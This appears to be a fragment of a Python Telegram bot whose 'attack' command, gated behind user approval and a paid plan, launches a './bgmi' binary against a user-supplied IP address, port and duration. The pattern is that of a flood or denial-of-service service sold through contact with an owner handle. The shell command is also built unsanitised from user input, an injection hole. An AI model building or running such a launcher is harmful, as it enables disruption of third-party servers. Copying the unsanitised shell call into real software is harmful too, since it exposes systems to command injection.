...
async def run_attack_command_async(message_id, chat_id, target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 120")
...
def attack_command(message):
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*You are not approved to use this bot. \nPlease contact @suicidebombs*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
            return
...
def owner_command(message):
    bot.send_message(message.chat.id, "*Owner - @suicidebombs*", parse_mode='Markdown', reply_markup=create_inline_keyboard())

@bot.message_handler(commands=['canary'])
def canary_command(message):
    bot.send_message(message.chat.id, "*DM - @suicidebombs*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
